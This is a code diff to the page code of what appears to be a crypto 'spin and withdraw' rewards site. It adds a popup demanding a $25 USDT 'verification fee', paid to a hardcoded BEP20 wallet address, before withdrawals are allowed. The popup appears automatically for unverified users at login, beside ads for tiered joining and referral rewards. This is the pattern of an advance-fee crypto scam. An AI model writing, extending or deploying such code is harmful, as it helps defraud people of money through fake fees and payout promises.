@@ -381,6 +381,19 @@ input:focus{outline:none;border-color:#2563eb;box-shadow:0 0 0 4px rgba(37,99,23
     <button class="btn w-full py-3 mt-4" onclick="closePop()">OK</button>
   </div>
 </div>
+  <div id="verify-box" class="hidden fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4">
+  <div class="card p-5 max-w-sm w-full">
+    <div class="serif text-2xl">Account verification</div>
+    <p class="text-sm mt-2">Submit the $25 USDT BEP20 verification fee. After admin approval, spin and withdraw will start.</p>
+    <input id="vf-user" class="inp mt-3" placeholder="Username">
+    <div class="text-xs mt-3">BEP20 USDT address</div>
+    <div class="text-xs break-all font-mono">0x59552E67B1a30Ee520C8B0701dA22bf398d0D0AE</div>
+    <button class="ghost rounded-lg px-3 py-1 mt-2 text-xs" onclick="navigator.clipboard.writeText('0x59552E67B1a30Ee520C8B0701dA22bf398d0D0AE')">Copy address</button>
+    <input id="vf-hash" class="inp mt-3" placeholder="TX hash">
+    <button class="btn w-full py-3 mt-3" onclick="submitVerify()">Submit hash</button>
+    <button class="w-full mt-2 text-sm" onclick="el('verify-box').classList.add('hidden')">Close</button>
+  </div>
+</div>
 <script>
 var ADDR="0x4E58b3522112BA59621d808E3687a566A87d7623";
 var ADMIN_ID="nivoadmin";
@@ -639,6 +652,7 @@ function enterUser(){
     if(el("h-name"))el("h-name").textContent=u.user;
     if(el("h-bal"))el("h-bal").textContent=money(u.bal);
     drawWheel();draw();tab("home");
+    if(!u.verified)setTimeout(showVerify,900);
     setTimeout(function(){pop("Direct rewards","$45 joining: 10% direct. $100 joining: $18 reward. $200 joining: $35 reward.");},800);
   });
 }
